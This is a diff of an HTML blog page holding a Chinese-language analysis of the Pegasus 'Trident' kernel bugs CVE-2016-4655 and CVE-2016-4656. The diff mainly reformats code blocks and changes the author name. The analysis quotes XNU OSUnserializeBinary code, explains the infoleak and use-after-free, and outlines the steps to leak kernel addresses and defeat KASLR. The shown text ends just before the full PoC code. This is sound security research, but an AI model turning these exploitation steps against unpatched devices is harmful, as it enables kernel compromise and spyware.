@@ -26,19 +26,21 @@
 <meta property="og:site_name" content="4ch12dy">
 <meta property="og:description" content="0x00 写在前面
  不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2">
+<meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/md_source/paper/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-0.png">
+<meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/md_source/paper/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-1.png">
+<meta property="og:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/md_source/paper/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-2.png">
 <meta property="og:updated_time" content="2017-05-01T11:59:39.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pegasus内核漏洞及PoC分析">
 <meta name="twitter:description" content="0x00 写在前面
  不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2">
+<meta name="twitter:image" content="https://github.com/4ch12dy/4ch12dy.github.io.git/4ch12dy/4ch12dy.github.io.git/md_source/paper/Pegasus内核漏洞及PoC分析/king/4chendyBlog/paper/Pegasus内核漏洞及PoC分析/pic/0-0.png">
   
     <link rel="alternate" href="/atom.xml" title="4ch12dy" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
   
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
   <link rel="stylesheet" href="../../../css/common.css">
 <link rel="stylesheet" href="../../../css/nav.css">
@@ -53,7 +55,7 @@
     <nav class="nav">
          <div class="nav-left">
             <a href="/" class="nav-item" style="font-size: 20px;">
-              <span class="logo">Diskobólos</span>'s Blog
+              <span class="logo">xia0</span>'s Blog
             </a>
          </div>
         <div class="nav-center is-hidden position-relative" id="search_container">
@@ -77,7 +79,7 @@
                 My Works
             </a>
             
-            <a class="nav-item" href="../../../about">
+            <a class="nav-item" href="../../../aboutme">
                 About
             </a>
             
@@ -97,7 +99,7 @@
                 My Works
             </a>
             
-            <a class="nav-item flex-1" href="../../../about">
+            <a class="nav-item flex-1" href="../../../aboutme">
                 About
             </a>
             
@@ -152,7 +154,7 @@
             
             <div class="is-flex align-center">
                 <img class="post-avatar" src="https://cdn2.iconfinder.com/data/icons/rcons-user/32/male-shadow-circle-512.png">
-                <span style="padding:0 10px;"> <span class="sub-title">By</span> Diskobólos</span>
+                <span style="padding:0 10px;"> <span class="sub-title">By</span> xia0</span>
                 <span class="post-date sub-title">at: 2017-05-01</span>
             </div>
             
@@ -187,8 +189,25 @@
 <li><p><code>OSUnserializeBinary</code>的二进制格式<br><code>OSUnserializeBinary</code>这个函数将连续的二进制流分成<code>uint32_t</code>32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下  </p>
 </li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#define kOSSerializeBinarySignature &quot;\323\0\0&quot; /* 0x000000d3 */</div><div class="line"></div><div class="line">enum &#123;</div><div class="line">    kOSSerializeDictionary      = 0x01000000U,</div><div class="line">    kOSSerializeArray           = 0x02000000U,</div><div class="line">    kOSSerializeSet             = 0x03000000U,</div><div class="line">    kOSSerializeNumber          = 0x04000000U,</div><div class="line">    kOSSerializeSymbol          = 0x08000000U,</div><div class="line">    kOSSerializeString          = 0x09000000U,</div><div class="line">    kOSSerializeData            = 0x0a000000U,</div><div class="line">    kOSSerializeBoolean         = 0x0b000000U,</div><div class="line">    kOSSerializeObject          = 0x0c000000U,</div><div class="line"></div><div class="line">    kOSSerializeTypeMask        = 0x7F000000U,</div><div class="line">    kOSSerializeDataMask        = 0x00FFFFFFU,</div><div class="line"></div><div class="line">    kOSSerializeEndCollection   = 0x80000000U,</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
-<p>这里的<code>0x000000d3</code>代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。<code>kOSSerializeTypeMask</code>和<code>kOSSerializeDataMask</code>分别为类型和数据大小掩码。<code>kOSSerializeEndCollection</code>代表当前集合(dic，array或set)是否结束。<br>可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。</p>
+<pre><code>#define kOSSerializeBinarySignature &quot;\323\0\0&quot; /* 0x000000d3 */
+
+enum {
+    kOSSerializeDictionary      = 0x01000000U,
+    kOSSerializeArray           = 0x02000000U,
+    kOSSerializeSet             = 0x03000000U,
+    kOSSerializeNumber          = 0x04000000U,
+    kOSSerializeSymbol          = 0x08000000U,
+    kOSSerializeString          = 0x09000000U,
+    kOSSerializeData            = 0x0a000000U,
+    kOSSerializeBoolean         = 0x0b000000U,
+    kOSSerializeObject          = 0x0c000000U,
+
+    kOSSerializeTypeMask        = 0x7F000000U,
+    kOSSerializeDataMask        = 0x00FFFFFFU,
+
+    kOSSerializeEndCollection   = 0x80000000U,
+};
+</code></pre><p>这里的<code>0x000000d3</code>代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。<code>kOSSerializeTypeMask</code>和<code>kOSSerializeDataMask</code>分别为类型和数据大小掩码。<code>kOSSerializeEndCollection</code>代表当前集合(dic，array或set)是否结束。<br>可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。</p>
 <table>
 <thead>
 <tr>
@@ -206,77 +225,336 @@
 </tbody>
 </table>
 <p>例如下面的二进制数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001</div></pre></td></tr></table></figure>
-<p>则对应：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;dict&gt;</div><div class="line">    &lt;string&gt;AAAA&lt;/string&gt;  //键key</div><div class="line">    &lt;boolean&gt;1&lt;/boolean&gt;  /值value</div><div class="line">&lt;/dict&gt;</div></pre></td></tr></table></figure>
-<p>这样的数据结构。对应过程也很简单，<code>0x000000d3</code>标志为合法的签名，<code>0x81000000</code>为dic类型且为最后一个元素，<code>0x09000004</code>为4字节大小的字符串，<code>0x8b000001</code>为bool型，所以只需用最后一位代表true或false</p>
+<pre><code>0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001
+</code></pre><p>则对应：</p>
+<pre><code>&lt;dict&gt;
+    &lt;string&gt;AAAA&lt;/string&gt;  //键key
+    &lt;boolean&gt;1&lt;/boolean&gt;  /值value
+&lt;/dict&gt;
+</code></pre><p>这样的数据结构。对应过程也很简单，<code>0x000000d3</code>标志为合法的签名，<code>0x81000000</code>为dic类型且为最后一个元素，<code>0x09000004</code>为4字节大小的字符串，<code>0x8b000001</code>为bool型，所以只需用最后一位代表true或false</p>
 <ol>
 <li><code>OSUnserializeBinary()</code>分析<br>完整源代码见文末，下面将对其中几个重要的地方分别做分析说明  </li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">while (ok)</div><div class="line">&#123;</div><div class="line">    bufferPos += sizeof(*next);</div><div class="line">    if (!(ok = (bufferPos &lt;= bufferSize))) break;</div><div class="line">    key = *next++;</div><div class="line"></div><div class="line">    len = (key &amp; kOSSerializeDataMask);</div><div class="line">    wordLen = (len + 3) &gt;&gt; 2;</div><div class="line">    end = (0 != (kOSSerializeEndCollecton &amp; key));</div><div class="line"></div><div class="line">    newCollect = isRef = false;</div><div class="line">    o = 0; newDict = 0; newArray = 0; newSet = 0;</div><div class="line"></div><div class="line">    switch (kOSSerializeTypeMask &amp; key)</div><div class="line">    &#123;</div><div class="line">        case kOSSerializeDictionary:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeArray:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeSet:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeObject:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeNumber:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeSymbol:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeString:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeData:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeBoolean:</div><div class="line">        ...</div><div class="line"></div><div class="line">        default:</div><div class="line">            break;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
-<p>进行一些初始化和检查后就进入<code>while(ok)</code>循环，并且是以32位的整数位单位遍历循环，读取当前的整数<code>key</code>，确定其长度<code>len</code>，当前集合31位是否设置<code>end</code>。并通过类型掩码<code>kOSSerializeTypeMask</code>确定其<code>key</code>的类型从而进入不同的case。例如我们看<code>kOSSerializeDictionary</code>例子  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeDictionary:</div><div class="line">    o = newDict = OSDictionary::withCapacity(len);</div><div class="line">    newCollect = (len != 0);</div><div class="line">    break;</div></pre></td></tr></table></figure>
-<p>o为指向当前反序列化对象的指针，在每种case中被指定  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeData:</div><div class="line">    bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">    if (bufferPos &gt; bufferSize) break;</div><div class="line">    o = OSData::withBytes(next, len);</div><div class="line">    next += wordLen;</div><div class="line">    break;</div></pre></td></tr></table></figure>
-<p>这里当遇到一个为<code>kOSSerializeData</code>类型时，根据其<code>len</code>找到其数据并将其存储在<code>OSData</code>数据结构中，并移动<code>next</code>。其他的case都做类似对应的处理。<br>跳出switch  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!(ok = (o != 0))) break;</div></pre></td></tr></table></figure>
-<p>因为每一次循环都会进入<code>case</code>并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if (!isRef)</div><div class="line">&#123;</div><div class="line">    setAtIndex(objs, objsIdx, o);</div><div class="line">    if (!ok) break;</div><div class="line">    objsIdx++;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这里很重要将与后面的漏洞相关，首先判断<code>isRef</code>是否被设置。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeObject:</div><div class="line">			if (len &gt;= objsIdx) break;</div><div class="line">			o = objsArray[len];</div><div class="line">			o-&gt;retain();</div><div class="line">			isRef = true;</div><div class="line">			break;</div></pre></td></tr></table></figure>
-<p><code>isRef</code>只有当当前的类型为<code>kOSSerializeObject</code>即引用类型是才被设为<code>true</code>，这里引用的意思则表示当前指向<code>dic</code>中其他数据，其值为对应下标。<br>回到前面那里，下面重点关注<code>setAtIndex</code>这个宏定义</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#define setAtIndex(v, idx, o)                                                           \</div><div class="line">    if (idx &gt;= v##Capacity)	                                                        \</div><div class="line">    &#123;                                                                                   \</div><div class="line">        uint32_t ncap = v##Capacity + 64;                                               \</div><div class="line">        typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));  \</div><div class="line">        if (!nbuf) ok = false;                                                          \</div><div class="line">        if (v##Array)                                                                   \</div><div class="line">        &#123;                                                                               \</div><div class="line">            bcopy(v##Array, nbuf, v##Capacity * sizeof(o));                             \</div><div class="line">            kfree(v##Array, v##Capacity * sizeof(o));                                   \</div><div class="line">        &#125;                                                                               \</div><div class="line">        v##Array    = nbuf;                                                             \</div><div class="line">        v##Capacity = ncap;                                                             \</div><div class="line">    &#125;                                                                                   \</div><div class="line">    if (ok) v##Array[idx] = o;</div></pre></td></tr></table></figure>
-<p>看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到<code>objs</code>数组中对应的位置。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">if (dict)</div><div class="line">&#123;</div><div class="line">        if (sym)</div><div class="line">        &#123;</div><div class="line">            if (o != dict) ok = dict-&gt;setObject(sym, o, true);</div><div class="line">            o-&gt;release();</div><div class="line">            sym-&gt;release();</div><div class="line">            sym = 0;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">            sym = OSDynamicCast(OSSymbol, o);</div><div class="line">            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</div><div class="line">            &#123;</div><div class="line">                sym = (OSSymbol *) OSSymbol::withString(str);</div><div class="line">                o-&gt;release();</div><div class="line">                o = 0;</div><div class="line">            &#125;</div><div class="line">            ok = (sym != 0);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else if (array)</div><div class="line">    &#123;</div><div class="line">        ok = array-&gt;setObject(o);</div><div class="line">        o-&gt;release();</div><div class="line">    &#125;</div><div class="line">    else if (set)</div><div class="line">    &#123;</div><div class="line">        ok = set-&gt;setObject(o);</div><div class="line">       o-&gt;release();</div><div class="line">   &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        assert(!parent);</div><div class="line">        result = o;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
-<p>对解析出来的当前的集合做对应处理，比如这里的如果<code>dic</code>为真，因为<code>dic</code>字典数据结构需要<code>key-&gt;value</code>键值对的形式，所以先判断<code>sym</code>，若没设置，则代表当前<code>o</code>对象为key，则将其转化为<code>OSSymbol</code>类型，设置<code>sym</code>为true并将<code>o</code>free，那么下一次的<code>o</code>代表的对象一定是值，然后就将<code>sym</code>和<code>o</code>以键值对的形式存储在<code>dic</code>字典中，如此交替。<br>后面的代码对漏洞来说不是很重要了  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">if (newCollect)</div><div class="line">&#123;</div><div class="line">	if (!end)</div><div class="line">	&#123;</div><div class="line">		stackIdx++;</div><div class="line">		setAtIndex(stack, stackIdx, parent);</div><div class="line">		if (!ok) break;</div><div class="line">	&#125;</div><div class="line">	DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">	parent = o;</div><div class="line">	dict   = newDict;</div><div class="line">	array  = newArray;</div><div class="line">	set    = newSet;</div><div class="line">	end    = false;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (end)</div><div class="line">&#123;</div><div class="line">	if (!stackIdx) break;</div><div class="line">	parent = stackArray[stackIdx];</div><div class="line">	DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">	stackIdx--;</div><div class="line">	set   = 0; </div><div class="line">	dict  = 0; </div><div class="line">	array = 0;</div><div class="line">	if (!(dict = OSDynamicCast(OSDictionary, parent)))</div><div class="line">	&#123;</div><div class="line">		if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当<code>end</code>时就将整个新集合放入之前的<code>dic</code>。</p>
+<pre><code>    while (ok)
+    {
+        bufferPos += sizeof(*next);
+        if (!(ok = (bufferPos &lt;= bufferSize))) break;
+        key = *next++;
+
+        len = (key &amp; kOSSerializeDataMask);
+        wordLen = (len + 3) &gt;&gt; 2;
+        end = (0 != (kOSSerializeEndCollecton &amp; key));
+
+        newCollect = isRef = false;
+        o = 0; newDict = 0; newArray = 0; newSet = 0;
+
+        switch (kOSSerializeTypeMask &amp; key)
+        {
+            case kOSSerializeDictionary:
+            ...
+
+            case kOSSerializeArray:
+            ...
+
+            case kOSSerializeSet:
+            ...
+
+            case kOSSerializeObject:
+            ...
+
+            case kOSSerializeNumber:
+            ...
+
+            case kOSSerializeSymbol:
+            ...
+
+            case kOSSerializeString:
+            ...
+
+            case kOSSerializeData:
+            ...
+
+            case kOSSerializeBoolean:
+            ...
+
+            default:
+                break;
+        }
+
+        ...
+</code></pre><p>进行一些初始化和检查后就进入<code>while(ok)</code>循环，并且是以32位的整数位单位遍历循环，读取当前的整数<code>key</code>，确定其长度<code>len</code>，当前集合31位是否设置<code>end</code>。并通过类型掩码<code>kOSSerializeTypeMask</code>确定其<code>key</code>的类型从而进入不同的case。例如我们看<code>kOSSerializeDictionary</code>例子  </p>
+<pre><code>case kOSSerializeDictionary:
+    o = newDict = OSDictionary::withCapacity(len);
+    newCollect = (len != 0);
+    break;
+</code></pre><p>o为指向当前反序列化对象的指针，在每种case中被指定  </p>
+<pre><code>case kOSSerializeData:
+    bufferPos += (wordLen * sizeof(uint32_t));
+    if (bufferPos &gt; bufferSize) break;
+    o = OSData::withBytes(next, len);
+    next += wordLen;
+    break;
+</code></pre><p>这里当遇到一个为<code>kOSSerializeData</code>类型时，根据其<code>len</code>找到其数据并将其存储在<code>OSData</code>数据结构中，并移动<code>next</code>。其他的case都做类似对应的处理。<br>跳出switch  </p>
+<pre><code>if (!(ok = (o != 0))) break;
+</code></pre><p>因为每一次循环都会进入<code>case</code>并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。  </p>
+<pre><code>if (!isRef)
+{
+    setAtIndex(objs, objsIdx, o);
+    if (!ok) break;
+    objsIdx++;
+}
+</code></pre><p>这里很重要将与后面的漏洞相关，首先判断<code>isRef</code>是否被设置。</p>
+<pre><code> case kOSSerializeObject:
+                if (len &gt;= objsIdx) break;
+                o = objsArray[len];
+                o-&gt;retain();
+                isRef = true;
+                break;
+</code></pre><p><code>isRef</code>只有当当前的类型为<code>kOSSerializeObject</code>即引用类型是才被设为<code>true</code>，这里引用的意思则表示当前指向<code>dic</code>中其他数据，其值为对应下标。<br>回到前面那里，下面重点关注<code>setAtIndex</code>这个宏定义</p>
+<pre><code>#define setAtIndex(v, idx, o)                                                           \
+    if (idx &gt;= v##Capacity)                                                            \
+    {                                                                                   \
+        uint32_t ncap = v##Capacity + 64;                                               \
+        typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));  \
+        if (!nbuf) ok = false;                                                          \
+        if (v##Array)                                                                   \
+        {                                                                               \
+            bcopy(v##Array, nbuf, v##Capacity * sizeof(o));                             \
+            kfree(v##Array, v##Capacity * sizeof(o));                                   \
+        }                                                                               \
+        v##Array    = nbuf;                                                             \
+        v##Capacity = ncap;                                                             \
+    }                                                                                   \
+    if (ok) v##Array[idx] = o;
+</code></pre><p>看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到<code>objs</code>数组中对应的位置。</p>
+<pre><code>if (dict)
+{
+        if (sym)
+        {
+            if (o != dict) ok = dict-&gt;setObject(sym, o, true);
+            o-&gt;release();
+            sym-&gt;release();
+            sym = 0;
+        }
+        else
+        {
+            sym = OSDynamicCast(OSSymbol, o);
+            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))
+            {
+                sym = (OSSymbol *) OSSymbol::withString(str);
+                o-&gt;release();
+                o = 0;
+            }
+            ok = (sym != 0);
+        }
+    }
+    else if (array)
+    {
+        ok = array-&gt;setObject(o);
+        o-&gt;release();
+    }
+    else if (set)
+    {
+        ok = set-&gt;setObject(o);
+       o-&gt;release();
+   }
+    else
+    {
+        assert(!parent);
+        result = o;
+    }
+</code></pre><p>对解析出来的当前的集合做对应处理，比如这里的如果<code>dic</code>为真，因为<code>dic</code>字典数据结构需要<code>key-&gt;value</code>键值对的形式，所以先判断<code>sym</code>，若没设置，则代表当前<code>o</code>对象为key，则将其转化为<code>OSSymbol</code>类型，设置<code>sym</code>为true并将<code>o</code>free，那么下一次的<code>o</code>代表的对象一定是值，然后就将<code>sym</code>和<code>o</code>以键值对的形式存储在<code>dic</code>字典中，如此交替。<br>后面的代码对漏洞来说不是很重要了  </p>
+<pre><code>
+        if (newCollect)
+        {
+            if (!end)
+            {
+                stackIdx++;
+                setAtIndex(stack, stackIdx, parent);
+                if (!ok) break;
+            }
+            DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);
+            parent = o;
+            dict   = newDict;
+            array  = newArray;
+            set    = newSet;
+            end    = false;
+        }
+
+        if (end)
+        {
+            if (!stackIdx) break;
+            parent = stackArray[stackIdx];
+            DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);
+            stackIdx--;
+            set   = 0; 
+            dict  = 0; 
+            array = 0;
+            if (!(dict = OSDynamicCast(OSDictionary, parent)))
+            {
+                if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));
+            }
+        }
+</code></pre><p>简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当<code>end</code>时就将整个新集合放入之前的<code>dic</code>。</p>
 <h2 id="0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656"><a href="#0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656" class="headerlink" title="0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656"></a>0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656</h2><p>这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞</p>
 <h3 id="CVE-2016-4655-infoleak"><a href="#CVE-2016-4655-infoleak" class="headerlink" title="CVE-2016-4655-infoleak"></a>CVE-2016-4655-infoleak</h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p>
 <p>下面看漏洞点，回顾之前<code>kOSSerializeNumber</code>这个case:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeNumber:</div><div class="line">    bufferPos += sizeof(long long);</div><div class="line">    if (bufferPos &gt; bufferSize) break;</div><div class="line">    value = next[1];</div><div class="line">    value &lt;&lt;= 32;</div><div class="line">    value |= next[0];</div><div class="line">    o = OSNumber::withNumber(value, len);</div><div class="line">    next += 2;</div><div class="line">    break;</div><div class="line">```  </div><div class="line">这里存在什么问题呢？这里没有检查`OSNumber`的长度，也就是说我们可以创建一个任意长度的`OSNumber`，进而在内核读取的时候越界，然后泄漏内核地址信息。</div><div class="line"></div><div class="line">### CVE-2016-4656-UAF漏洞</div><div class="line">UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。  </div><div class="line">来看下漏洞点，下面的代码是序列化字典dic将`OSString`这个键转化为`OSSymbol`</div></pre></td></tr></table></figure>
-<p>if (dict)<br>{<br>        if (sym)<br>        {<br>            …<br>        }<br>        else<br>        {<br>            sym = OSDynamicCast(OSSymbol, o);<br>            if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))<br>            {<br>                sym = (OSSymbol *) OSSymbol::withString(str);<br>                o-&gt;release();<br>                o = 0;<br>            }<br>            ok = (sym != 0);<br>        }<br>    }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这里`o-&gt;release()`有什么问题呢?还记得`objsArray`吧，用来存储所有的对象，但是用`setAtIndex`这个宏来将所有的对象`o`存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面`kOSSerializeObject`中的`switchcase`：</div></pre></td></tr></table></figure></p>
-<p>case kOSSerializeObject:<br>    if (len &gt;= objsIdx) break;<br>    o = objsArray[len];<br>    o-&gt;retain();<br>    isRef = true;<br>    break;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">此时之前存储在之前的`objsArray`的`OSString`已经free，而 `o = objsArray[len]; o-&gt;retain();`由对其进行了`retain`引用，好的一个完美的UAF漏洞。  </div><div class="line">所以我们可以构造一个字典`dic`，其中`OSString`包含一些配对的值，然后序列化一个`kOSSerializeObject`引用对象，`OSString`将调用`retain`，但却是一个被释放的对象。  </div><div class="line"></div><div class="line">## 0x04 漏洞利用-PoC分析</div><div class="line">同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</div><div class="line"></div><div class="line">### CVE-2016-4655-infoleak漏洞利用</div><div class="line">infoleak漏洞利用步骤：</div><div class="line"></div><div class="line"> * 构造一个包含过长的`OSNumber`dic字典</div><div class="line"> * 用这个序列化字典去设置userclient对象的属性</div><div class="line"> * 读回设置的`OSNumber`属性，造成infoleak</div><div class="line"> * 利用读取回来的内核地址信息计算KASLR    </div><div class="line"></div><div class="line">完整的代码：</div></pre></td></tr></table></figure></p>
